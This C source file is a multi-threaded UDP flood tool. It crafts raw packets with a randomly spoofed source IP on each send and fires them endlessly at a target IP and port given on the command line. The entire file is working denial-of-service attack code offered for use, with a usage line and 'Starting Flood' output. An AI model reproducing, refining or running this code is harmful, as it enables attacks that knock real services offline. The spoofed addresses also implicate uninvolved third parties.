#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
 
#define MAX_PACKET_SIZE 256
#define PHI 0x9e3779b9
 
static uint32_t Q[1024], c = 362436;
const char* STRINGS[] = {"6&0xFF=0,2:5,7:16,18:255", "26&0xFFFFFFFF=0xfeff", "12&0xFFFF=0", "28&0x00000FF0=0xFEDFFFFF", "12&0xFFFF=0xFFFF"};


 
struct thread_data {
        int throttle;
        int thread_id;
        unsigned int floodport;
        struct sockaddr_in sin;
};
 
void init_rand(uint32_t x)
{
        int i;
 
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
 
        for (i = 3; i < 256; i++)
                Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
 
uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 255;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 255;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
 
 

 
 
/* function for header checksums */
unsigned short csum (unsigned short *buf, int nwords)
{
  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
  sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return (unsigned short)(~sum);
}
void setup_ip_header(struct iphdr *iph)
{
  
  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;
  iph->tot_len = sizeof(struct iphdr) + 15;
  iph->id = htonl(54321);
  iph->frag_off = 0;
  iph->ttl = 64;
  iph->protocol = IPPROTO_UDP;
  iph->check = 0;
 
  // Initial IP, changed later in infinite loop
  iph->saddr = inet_addr("192.168.0.1");
}
 
void setup_udp_header(struct udphdr *udph)
{

  const char* data = (char *)udph + sizeof(struct udphdr);
  data = STRINGS[1 + rand() % 2];

  
  udph->source = htons(rand_cmwc() & 0xFFFF);;
  udph->check = 0;
  
  udph->len = htons(sizeof (struct udphdr) + 15);
}
 
void *flood(void *par1)
{
  struct thread_data *td = (struct thread_data *)par1;
  fprintf(stdout, "Thread %d started\n", td->thread_id);
  char datagram[MAX_PACKET_SIZE];
  struct iphdr *iph = (struct iphdr *)datagram;
  struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
  struct sockaddr_in sin = td->sin;
  char new_ip[sizeof "255.255.255.255"];
 
  int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
  if(s < 0){
    fprintf(stderr, "Could not open raw socket.\n");
    exit(-1);
  }
 
  unsigned int floodport = td->floodport;
 
  // Clear the data
  memset(datagram, 0, MAX_PACKET_SIZE);
 
  // Set appropriate fields in headers
  setup_ip_header(iph);
  setup_udp_header(udph);
 
  udph->dest = htons(floodport);
 
  iph->daddr = sin.sin_addr.s_addr;
  iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
 
  int tmp = 1;
  const int *val = &tmp;
  if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
    fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
    exit(-1);
  }
 
  int throttle = td->throttle;
 
  uint32_t random_num;
  uint32_t ul_dst;
  init_rand(time(NULL));
  if(throttle == 0){
    while(1){
      
      random_num = rand_cmwc();
 
      ul_dst = (random_num >> 24 & 0xFF) << 24 |
               (random_num >> 16 & 0xFF) << 16 |
               (random_num >> 8 & 0xFF) << 8 |
               (random_num & 0xFF);
 
      iph->saddr = ul_dst;
	  iph->id = htonl(random_num & 0xFFFF);
      udph->source = htons(random_num & 0xFFFF);
      iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
	  sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
	  sleep(0.675);
    }
  } else {
    while(1){
		
	  random_num = rand_cmwc();
	  ul_dst = (random_num >> 24 & 0xFF) << 24 |
               (random_num >> 16 & 0xFF) << 16 |
               (random_num >> 8 & 0xFF) << 8 |
               (random_num & 0xFF);
	  
      throttle = td->throttle;
	  iph->saddr = ul_dst;
	  iph->id = htonl(random_num & 0xFFFF);
      udph->source = htons(random_num & 0xFFFF);
      iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
      sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
	  sleep(0.675);
      
 
      
 
      
 
     while(--throttle);
    }
  }
}
int main(int argc, char *argv[ ])
{
  if(argc < 5){
    fprintf(stderr, "Invalid parameters!\n");
    fprintf(stdout, "Usage: %s <target IP> <port to be flooded> <throttle> <number threads to use> <time>\n", argv[0]);
    exit(-1);
  }
 
  fprintf(stdout, "Setting up Sockets...\n");
 
  int num_threads = atoi(argv[4]);
  unsigned int floodport = atoi(argv[2]);
  pthread_t thread[num_threads];
  struct sockaddr_in sin;
 
  sin.sin_family = AF_INET;
  sin.sin_port = htons(floodport);
  sin.sin_addr.s_addr = inet_addr(argv[1]);
 
  struct thread_data td[num_threads];
 
  int i;
  for(i = 0;i<num_threads;i++){
    td[i].thread_id = i;
    td[i].sin = sin;
    td[i].floodport = floodport;
    td[i].throttle = atoi(argv[3]);
    pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
  }
  fprintf(stdout, "Starting Flood...\n");
  if(argc > 5)
  {
    sleep(atoi(argv[5]));
  } else {
    while(1){
      sleep(1);
    }
  }
 
  return 0;
}